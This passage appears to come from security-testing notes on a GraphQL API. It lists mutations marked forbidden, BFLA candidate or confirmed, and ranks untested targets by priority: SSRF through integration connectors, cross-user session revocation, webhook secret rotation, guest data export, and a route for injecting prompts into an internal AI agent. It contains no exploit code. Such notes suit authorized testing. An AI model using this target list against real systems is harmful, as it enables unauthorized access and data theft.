userChangeRole(id,input)                               FORBIDDEN to member
userSuspend(id)                                        FORBIDDEN to member
userRevokeAllSessions(id)
userRevokeSession(id)                                  revoke single session — cross-user BFLA candidate
userUnsuspend(id)
userUnlinkFromIdentityProvider(id)
userSettingsUpdate(input)
userSettingsFlagsReset(input)
userFlagUpdate(input)                                  internal feature flags — enumerate enum values
notificationCategoryChannelSubscriptionUpdate(input)

# === VIEW PREFERENCES ===
viewPreferencesCreate(input)
viewPreferencesUpdate(id,input)
viewPreferencesDelete(id)

# === WEBHOOK ===
webhookCreate(input)                                   FORBIDDEN to member
webhookUpdate(id,input)
webhookDelete(id)
webhookRotateSecret(id)                                rotate HMAC secret — member BFLA candidate

# === WORKFLOW STATE ===
workflowStateCreate(input)                             BFLA confirmed (Finding 004)
workflowStateUpdate(id,input)
workflowStateArchive(id)
```

---

## Untested priority targets (ranked)

| Priority | Surface | Hypothesis |
|---|---|---|
| P1 | `agentActivityCreatePrompt(input)` [Internal] | Bypasses OAuth app token req for agent prompt injection |
| P1 | `agentSessionCreate(pullRequestId,input)` [Internal] | Same bypass path; direct agent session creation |
| P1 | `airbyteIntegrationConnect` | No blocklist like GHE SSRF (Finding 003) |
| P1 | `integrationOpsgenieConnect` [Internal] | Same — outbound HTTP, likely no blocklist |
| P1 | `integrationPagerDutyConnect` [Internal] | Same |
| P2 | `userRevokeSession(id)` | Member revokes another user's session (cross-user auth disruption) |
| P2 | `userSessions(id)` [Internal] | "Admin only" — does member BFLA pattern apply? |
| P2 | `webhookRotateSecret(id)` | Member rotates webhook HMAC secret they don't own |
| P2 | `organizationStartTrialForPlan` | Member/guest upgrades workspace plan |
| P2 | `createCsvExportReport` | Guest exports all workspace data |
| P3 | `integrationGitlabTestConnection(id)` | Outbound HTTP test request — SSRF candidate |
| P3 | `integrationMcpServerConnect` [Internal] | Workspace-level MCP; same customHeaders forward behavior? |
| P3 | `administrableTeams` vs `teams` | Diff results as member — unexpected admin scope? |
| P3 | `semanticSearch` as guest | Cross-team result leak via NL search |
| P3 | `documentContentHistoryEntries(entryIds)` [Internal] | Fetch deleted doc content by UUID |
| P3 | `pushSubscriptionTest(targetMobile,sendStrategy)` | Arbitrary device notification send |
